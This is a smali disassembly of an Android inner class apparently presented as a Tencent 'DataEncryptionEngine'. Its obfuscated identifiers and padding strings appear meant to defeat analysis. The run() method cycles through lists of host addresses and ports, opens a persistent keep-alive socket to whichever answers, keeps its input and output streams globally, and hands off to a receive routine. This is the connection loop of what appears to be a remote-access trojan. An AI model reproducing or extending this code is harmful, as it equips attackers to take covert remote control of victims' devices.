.class Lcom/tencent/DataEncryptionEngine$1;
.super Ljava/lang/Object;
.source "tunesxconcerningn102.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/tencent/DataEncryptionEngine;->gnufprovincialy35(Ljava/lang/String;Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic val$F__tunesxconcerningn102_F:Ljava/lang/String;

.field final synthetic val$P_tunesxconcerningn102_P:Ljava/lang/String;


# direct methods
.method constructor <init>(Ljava/lang/String;Ljava/lang/String;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .line 35
    iput-object p1, p0, Lcom/tencent/DataEncryptionEngine$1;->val$F__tunesxconcerningn102_F:Ljava/lang/String;

    iput-object p2, p0, Lcom/tencent/DataEncryptionEngine$1;->val$P_tunesxconcerningn102_P:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    .line 37
    iget-object v0, p0, Lcom/tencent/DataEncryptionEngine$1;->val$F__tunesxconcerningn102_F:Ljava/lang/String;

    sget-object v1, Lcom/tencent/DataPackagingEngine;->t_tunesxconcerningn103_g:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 38
    iget-object v1, p0, Lcom/tencent/DataEncryptionEngine$1;->val$P_tunesxconcerningn102_P:Ljava/lang/String;

    sget-object v2, Lcom/tencent/DataPackagingEngine;->t_tunesxconcerningn103_g:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    .line 40
    :cond_0
    sget-object v2, Lcom/tencent/DataEncryptionEngine;->ctx:Landroid/content/Context;

    invoke-static {v2}, Lcom/tencent/DataPackagingEngine;->sv(Landroid/content/Context;)Z

    move-result v2

    const/4 v3, 0x0

    if-nez v2, :cond_1

    .line 41
    sget-object v2, Lcom/tencent/DataEncryptionEngine;->ctx:Landroid/content/Context;

    invoke-static {v2, v3}, Lcom/tencent/DataPackagingEngine;->WK_tunesxconcerningn103_L(Landroid/content/Context;Z)V

    .line 44
    :cond_1
    array-length v2, v0

    array-length v4, v1

    if-ne v2, v4, :cond_4

    move v2, v3

    :cond_2
    const/4 v4, 0x1

    .line 48
    :try_start_0
    aget-object v5, v0, v2

    invoke-static {v5}, Ljava/net/InetAddress;->getByName(Ljava/lang/String;)Ljava/net/InetAddress;

    move-result-object v5

    sput-object v5, Lcom/tencent/DataEncryptionEngine;->adre_tunesxconcerningn102_sses:Ljava/net/InetAddress;

    .line 49
    new-instance v5, Ljava/net/InetSocketAddress;

    sget-object v6, Lcom/tencent/DataEncryptionEngine;->adre_tunesxconcerningn102_sses:Ljava/net/InetAddress;

    aget-object v7, v1, v2

    invoke-static {v7}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/Integer;->intValue()I

    move-result v7

    invoke-direct {v5, v6, v7}, Ljava/net/InetSocketAddress;-><init>(Ljava/net/InetAddress;I)V

    sput-object v5, Lcom/tencent/DataEncryptionEngine;->sca_tunesxconcerningn102_drees:Ljava/net/InetSocketAddress;

    .line 50
    new-instance v5, Ljava/net/Socket;

    invoke-direct {v5}, Ljava/net/Socket;-><init>()V

    sput-object v5, Lcom/tencent/DataEncryptionEngine;->rec_tunesxconcerningn102_iver:Ljava/net/Socket;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 54
    :try_start_1
    sget-object v5, Lcom/tencent/DataEncryptionEngine;->rec_tunesxconcerningn102_iver:Ljava/net/Socket;

    invoke-virtual {v5, v3}, Ljava/net/Socket;->setSoTimeout(I)V

    .line 55
    sget-object v5, Lcom/tencent/DataEncryptionEngine;->rec_tunesxconcerningn102_iver:Ljava/net/Socket;

    invoke-virtual {v5, v4}, Ljava/net/Socket;->setKeepAlive(Z)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 63
    :catch_0
    :try_start_2
    sget-object v5, Lcom/tencent/DataEncryptionEngine;->rec_tunesxconcerningn102_iver:Ljava/net/Socket;

    sget-object v6, Lcom/tencent/DataEncryptionEngine;->sca_tunesxconcerningn102_drees:Ljava/net/InetSocketAddress;

    const v7, 0xea60

    invoke-virtual {v5, v6, v7}, Ljava/net/Socket;->connect(Ljava/net/SocketAddress;I)V

    .line 64
    sget-object v5, Lcom/tencent/DataEncryptionEngine;->rec_tunesxconcerningn102_iver:Ljava/net/Socket;

    invoke-virtual {v5}, Ljava/net/Socket;->isConnected()Z

    move-result v5

    sput-boolean v5, Lcom/tencent/DataEncryptionEngine;->q:Z

    .line 65
    sget-boolean v5, Lcom/tencent/DataEncryptionEngine;->q:Z

    if-eqz v5, :cond_3

    .line 66
    sget-object v5, Lcom/tencent/DataEncryptionEngine;->rec_tunesxconcerningn102_iver:Ljava/net/Socket;

    const v6, 0x32000

    invoke-virtual {v5, v6}, Ljava/net/Socket;->setSendBufferSize(I)V

    .line 67
    sget-object v5, Lcom/tencent/DataEncryptionEngine;->rec_tunesxconcerningn102_iver:Ljava/net/Socket;

    invoke-virtual {v5, v6}, Ljava/net/Socket;->setReceiveBufferSize(I)V

    .line 68
    new-instance v5, Ljava/io/DataInputStream;

    new-instance v6, Ljava/io/BufferedInputStream;

    sget-object v7, Lcom/tencent/DataEncryptionEngine;->rec_tunesxconcerningn102_iver:Ljava/net/Socket;

    invoke-virtual {v7}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v5, v6}, Ljava/io/DataInputStream;-><init>(Ljava/io/InputStream;)V

    sput-object v5, Lcom/tencent/DataEncryptionEngine;->inputnew:Ljava/io/DataInputStream;

    .line 69
    sget-object v5, Lcom/tencent/DataEncryptionEngine;->rec_tunesxconcerningn102_iver:Ljava/net/Socket;

    invoke-virtual {v5}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v5

    sput-object v5, Lcom/tencent/DataEncryptionEngine;->outpu_tunesxconcerningn102_tnew:Ljava/io/OutputStream;

    goto :goto_1

    :cond_3
    const-string v5, "SDGATHShypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41HTEGKUY"

    .line 72
    invoke-static {v5}, Lcom/tencent/DataEncryptionEngine;->CLOSEALLINTENT(Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_0

    :catch_1
    const-string v5, "ghtyjthypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41jghfd"

    .line 75
    invoke-static {v5}, Lcom/tencent/DataEncryptionEngine;->CLOSEALLINTENT(Ljava/lang/String;)V

    :goto_0
    const-wide/16 v5, 0x1

    .line 78
    :try_start_3
    invoke-static {v5, v6}, Ljava/lang/Thread;->sleep(J)V
    :try_end_3
    .catch Ljava/lang/InterruptedException; {:try_start_3 .. :try_end_3} :catch_2

    :catch_2
    add-int/lit8 v2, v2, 0x1

    .line 80
    array-length v5, v0

    sub-int/2addr v5, v4

    if-le v2, v5, :cond_2

    .line 82
    :cond_4
    :goto_1
    invoke-static {v3}, Lcom/tencent/DataPackagingEngine;->rel(Z)V

    const-wide/16 v2, 0x3e8

    .line 83
    :try_start_4
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_4
    .catch Ljava/lang/InterruptedException; {:try_start_4 .. :try_end_4} :catch_3

    .line 84
    :catch_3
    sget-boolean v2, Lcom/tencent/DataEncryptionEngine;->q:Z

    if-eqz v2, :cond_0

    .line 85
    sget-boolean v0, Lcom/tencent/DataEncryptionEngine;->q:Z

    if-eqz v0, :cond_5

    .line 86
    invoke-static {}, Lcom/tencent/DataEncryptionEngine;->r_tunesxconcerningn102_cv()V

    :cond_5
    return-void
.end method
